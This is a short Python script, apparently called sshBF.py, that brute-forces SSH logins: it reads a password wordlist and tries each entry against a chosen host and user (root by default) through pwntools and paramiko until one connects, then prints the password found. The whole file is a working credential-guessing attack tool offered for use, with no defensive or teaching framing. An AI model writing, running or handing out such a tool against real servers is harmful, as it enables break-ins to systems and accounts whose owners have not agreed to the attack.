from pwn import *
import paramiko
import argparse

# define enums
VR = "0.1.0"
AUTHOR = "UnderATK"

# text coloring enums
WHITE_TXT = "\033[0m"
GREY_TXT = "\033[30m"
GRN_TXT = "\033[0;32m"
ERR_TXT = "\033[31m"

def brute(host, user, word_list):
    attempts = 0
    print(f"{user}@{host}")
    if not word_list:
        print(f"{ERR_TXT}[Error] Must provide password list.")
        print(f"{GREY_TXT}Please user: -w/--word <PATH>")

    with open(word_list, "r") as password_list:
        for password in password_list:
            password = password.strip("\n")
            try:
                print(f"[{attempts}] Trying password: {password}")
                response = ssh(host=host, user=user, password=password, timeout=1)
                if response.connected():
                    print(f"{GRN_TXT}[+] {WHITE_TXT}Password found: {GRN_TXT + password}")
                    response.close()
                    break
                response.close()
            except paramiko.ssh_exception.AuthenticationException:
                print(f"{ERR_TXT}[X] {WHITE_TXT}Invalid password.")
            attempts += 1
    
# Welcome banner
print("-" * 50)
print(f"-----\tSSH BruteForcer")
print(f"-----\tBy {AUTHOR}")
print("-" * 50)

parser = argparse.ArgumentParser(
    prog="SSH BruteForcer",
    description="SSH BruteForce program.",
    usage="python3 sshBF.py [-h] [-H HOST_IP] [-u USERNAME] [-w WORD_LIST] [--version]",
    epilog="Get the best of your service! For any additional needs for this script please feel free to contact me.")
parser.add_argument('-H', "--host", help="Host ip.", default="localhost")
parser.add_argument('-u', "--user", help="Username.", default="root")
parser.add_argument('-w', "--word", help="Passwords word list.")
parser.add_argument("--version", action="version", version="%(prog)s - Version {}".format(VR))
args = parser.parse_args()

brute(host=args.host,user=args.user,word_list=args.word)
